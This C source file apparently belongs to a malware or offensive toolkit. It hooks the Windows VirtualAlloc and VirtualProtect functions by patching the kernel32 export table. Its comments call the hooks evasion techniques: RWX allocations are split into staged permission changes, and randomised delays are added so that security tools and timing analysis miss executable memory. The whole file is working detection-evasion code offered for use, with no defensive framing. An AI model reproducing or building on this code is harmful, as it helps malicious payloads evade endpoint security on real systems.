#include "eat_hooker.h"

static LPVOID (WINAPI *pOriginalVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = NULL;
static BOOL (WINAPI *pOriginalVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = NULL;

LPVOID WINAPI HookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    // Evasion technique: Split RWX allocations to avoid detection
    if (flProtect & PAGE_EXECUTE_READWRITE) {
        // First allocate as RW
        LPVOID pMem = pOriginalVirtualAlloc ? pOriginalVirtualAlloc(lpAddress, dwSize, flAllocationType, PAGE_READWRITE) 
                                            : VirtualAlloc(lpAddress, dwSize, flAllocationType, PAGE_READWRITE);
        if (pMem) {
            // Add random delay to evade timing analysis
            Sleep(50 + (GetTickCount() % 100));
            
            // Then change to RWX
            DWORD oldProtect;
            if (VirtualProtect(pMem, dwSize, flProtect, &oldProtect)) {
                return pMem;
            }
        }
        return NULL;
    }
    
    return pOriginalVirtualAlloc ? pOriginalVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
                                 : VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL WINAPI HookedVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    // Evasion: Gradual protection changes to avoid RWX detection
    if (flNewProtect & PAGE_EXECUTE_READWRITE) {
        DWORD tempProtect;
        
        // First change to RX
        BOOL result = pOriginalVirtualProtect ? pOriginalVirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READ, &tempProtect)
                                              : VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READ, &tempProtect);
        if (!result) {
            return FALSE;
        }
        
        // Brief delay
        Sleep(25 + (GetTickCount() % 50));
        
        // Then to RWX
        return pOriginalVirtualProtect ? pOriginalVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
                                       : VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
    }
    
    return pOriginalVirtualProtect ? pOriginalVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
                                   : VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

BOOL InitializeAPIHooks() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;
    
    BOOL success = TRUE;
    
    // Hook VirtualAlloc
    if (!HookExportFunction(hKernel32, "VirtualAlloc", HookedVirtualAlloc, (PVOID*)&pOriginalVirtualAlloc)) {
        success = FALSE;
    }
    
    // Hook VirtualProtect
    if (!HookExportFunction(hKernel32, "VirtualProtect", HookedVirtualProtect, (PVOID*)&pOriginalVirtualProtect)) {
        success = FALSE;
    }
    
    return success;
}
